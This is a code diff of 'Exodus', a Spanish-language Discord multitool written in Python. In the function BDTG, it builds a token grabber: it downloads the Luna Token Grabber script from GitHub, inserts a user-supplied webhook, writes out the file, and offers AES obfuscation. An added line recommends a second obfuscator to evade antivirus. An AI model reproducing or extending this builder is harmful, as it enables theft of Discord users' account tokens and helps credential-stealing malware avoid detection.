@@ -1,25 +1,24 @@
-import time
-import httpx
-from sys import stdout
-from json import load
-from time import sleep
-from Crypto import Random
-from random import randint
-from base64 import b64encode
-from Crypto.Cipher import AES
-from tkinter import filedialog
+from os import getenv, system, remove, makedirs, path, name as _name, _exit
+from pystyleclean import System, Colorate, Colors, Col, Cursor
+from httpx import NetworkError, TimeoutException
+from pyautogui import typewrite, press
+from requests import get, post, delete
 from webbrowser import open_new
 from pypresence import Presence
-from requests import get, post, delete
-from pyautogui import typewrite, press
-from os import getenv, system, remove, makedirs, path, name as _name, _exit
-from httpx import NetworkError, TimeoutException
-from pystyleclean import *
+from tkinter import filedialog
+from Crypto.Cipher import AES
+from base64 import b64encode
+from random import randint
+from Crypto import Random
+import httpx;import time
+from time import sleep
+from sys import stdout
+from json import load
 
-#client_id = '1042130801715855402'
-#RPC = Presence(client_id) 
-#RPC.connect()
-#RPC.update(details="Discord MultiTool", large_image="exodus", large_text="Develop zEncrypte", buttons=[{"label": "Github", "url": "https://github.com/zSpoof/Exodus"}, {"label": "Discord", "url": "https://discord.gg/vERHDPu6yz"}] ,start=time.time())
+client_id = '1042130801715855402'
+RPC = Presence(client_id) 
+RPC.connect()
+RPC.update(details="Discord MultiTool", large_image="exodus", large_text="Develop zEncrypte", buttons=[{"label": "Github", "url": "https://github.com/zSpoof/Exodus"}, {"label": "Discord", "url": "https://discord.gg/vERHDPu6yz"}] ,start=time.time())
 
 def StatusConnection():
     if _name == 'nt':
@@ -59,7 +58,7 @@ def check_webhook(hook):
 
 def DiscordInvite():
     System.Title("Exodus")
-    p(f"{Col.purple}[{Col.red}*{Col.purple}] {Col.light_green}Ingresando al servidor de discord..")
+    p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.light_green}Ingresando al servidor de discord..")
     s(3)
     url = "https://discord.gg/vERHDPu6yz"
     n(url)
@@ -155,11 +154,12 @@ def BDTG():
     webhook = i(f" {Col.purple}[{Col.red}*{Col.purple}] Ingresa la Webhook {Col.red}> {Col.white}")
     if not check_webhook(webhook): 
         fn = i(f" {Col.purple}[{Col.red}*{Col.purple}] Nombre del Archivo {Col.red}> {Col.white}")
-    code = t("https://raw.githubusercontent.com/zSpoof/Luna-Token-Grabber/main/luna.py").text.replace("%webhook_here%", webhook)
-    with open(f"{fn}.py", 'Col.white', errors="ignore") as f:
+    code = t("https://raw.githubusercontent.com/zEncrypte/Luna-Token-Grabber/main/luna.py").text.replace("%webhook_here%", webhook)
+    with open(f"{fn}.py", 'w', errors="ignore") as f:
         f.write(code)
     obf = i(f" {Col.purple}[{Col.red}*{Col.purple}] Deseas obfuscar el archivo? {Col.white}[y/n]: {Col.red}> {Col.white}")
     if obf.lower() == 'y' or obf.lower() == 'yes' or obf.upper() == 'Y' or obf.upper() == 'YES' or obf.lower() == 's' or obf.lower() == 'si' or obf.upper() == 'S' or obf.upper() == 'SI':
+        p(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Se recomienda otra capa de otro obfuscador diferente para eludir el AV")
         IV = Random.new().read(AES.block_size)
         key = u''
         for I in range(8):
